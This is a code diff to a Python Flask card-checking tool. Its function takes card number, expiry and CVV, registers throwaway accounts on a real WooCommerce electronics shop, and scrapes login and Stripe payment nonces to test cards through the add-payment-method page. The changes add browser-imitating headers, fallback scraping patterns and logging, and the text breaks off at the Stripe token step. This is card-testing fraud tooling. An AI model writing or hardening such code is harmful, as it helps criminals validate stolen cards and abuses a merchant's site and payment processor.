@@ -3,6 +3,16 @@ import requests
 import re
 import random
 import string
+import logging
+import sys
+
+# Configure logging
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    stream=sys.stderr
+)
+logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
@@ -12,7 +22,14 @@ app = Flask(__name__)
 def full_stripe_check(cc, mm, yy, cvv):
     session = requests.Session()
     session.headers.update({
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'accept-language': 'en-US,en;q=0.9',
+        'accept-encoding': 'gzip, deflate, br',
+        'referer': 'https://www.ftelettronica.com/',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
     })
 
     if len(yy) == 4:
@@ -20,26 +37,75 @@ def full_stripe_check(cc, mm, yy, cvv):
 
     try:
         # Step 1 & 2: Get login nonce
-        login_page_res = session.get('https://www.ftelettronica.com/my-account-2/')
+        logger.info("Step 1: Fetching login page...")
+        login_page_res = session.get('https://www.ftelettronica.com/my-account-2/', timeout=15)
+        logger.info(f"Login page status: {login_page_res.status_code}")
+        
+        # Debug: Check if we got a valid response
+        if login_page_res.status_code != 200:
+            logger.error(f"Login page failed with status {login_page_res.status_code}")
+            return {"status": "Declined", "response": f"Login page returned status {login_page_res.status_code}", "decline_type": "process_error"}
+        
+        logger.debug(f"Login page length: {len(login_page_res.text)} chars")
+        
         login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
         if not login_nonce_match:
-            return {"status": "Declined", "response": "Failed to get login nonce.", "decline_type": "process_error"}
+            # Try alternative pattern
+            logger.warning("Primary nonce pattern failed, trying alternative...")
+            login_nonce_match = re.search(r'woocommerce-register-nonce["\s]+value=["\'](.*?)["\']', login_page_res.text)
+        
+        if not login_nonce_match:
+            logger.error("Failed to extract login nonce from page")
+            # Save first 500 chars of response for debugging
+            logger.debug(f"Page preview: {login_page_res.text[:500]}")
+            return {"status": "Declined", "response": "Failed to get login nonce. Site may have changed structure.", "decline_type": "process_error"}
+        
         login_nonce = login_nonce_match.group(1)
+        logger.info(f"Login nonce extracted: {login_nonce[:10]}...")
 
         # Step 3: Register a new account for a valid session
         random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
+        logger.info(f"Step 2: Registering account with email: {random_email}")
+        
         register_data = {
-            'email': random_email, 'woocommerce-register-nonce': login_nonce,
-            '_wp_http_referer': '/my-account-2/', 'register': 'Register',
+            'email': random_email, 
+            'password': 'SecurePass' + ''.join(random.choices(string.digits, k=6)) + '!',
+            'woocommerce-register-nonce': login_nonce,
+            '_wp_http_referer': '/my-account-2/', 
+            'register': 'Register',
         }
-        session.post('https://www.ftelettronica.com/my-account-2/', data=register_data)
+        reg_response = session.post('https://www.ftelettronica.com/my-account-2/', data=register_data, timeout=15)
+        logger.info(f"Registration response status: {reg_response.status_code}")
 
         # Step 4: Get payment nonce with the valid session
-        payment_page_res = session.get('https://www.ftelettronica.com/my-account-2/add-payment-method/')
+        logger.info("Step 3: Fetching payment method page...")
+        payment_page_res = session.get('https://www.ftelettronica.com/my-account-2/add-payment-method/', timeout=15)
+        logger.info(f"Payment page status: {payment_page_res.status_code}")
+        
+        if payment_page_res.status_code != 200:
+            logger.error(f"Payment page failed with status {payment_page_res.status_code}")
+            return {"status": "Declined", "response": f"Payment page returned status {payment_page_res.status_code}", "decline_type": "process_error"}
+        
+        logger.debug(f"Payment page length: {len(payment_page_res.text)} chars")
+        
         payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
         if not payment_nonce_match:
-            return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
+            # Try alternative patterns
+            logger.warning("Primary payment nonce pattern failed, trying alternative...")
+            payment_nonce_match = re.search(r'createAndConfirmSetupIntentNonce["\s:]+["\'](.*?)["\']', payment_page_res.text)
+        
+        if not payment_nonce_match:
+            logger.error("Failed to extract payment nonce from page")
+            # Check if we're logged in by looking for account elements
+            if 'my-account' in payment_page_res.url or 'logout' in payment_page_res.text.lower():
+                logger.info("Session appears valid (logged in)")
+            else:
+                logger.warning("May not be logged in - registration might have failed")
+            logger.debug(f"Payment page preview: {payment_page_res.text[:500]}")
+            return {"status": "Declined", "response": "Failed to get payment nonce. Registration may have failed.", "decline_type": "process_error"}
+        
         ajax_nonce = payment_nonce_match.group(1)
+        logger.info(f"Payment nonce extracted: {ajax_nonce[:10]}...")
 
         # Step 5: Get Stripe payment token
         stripe_data = (
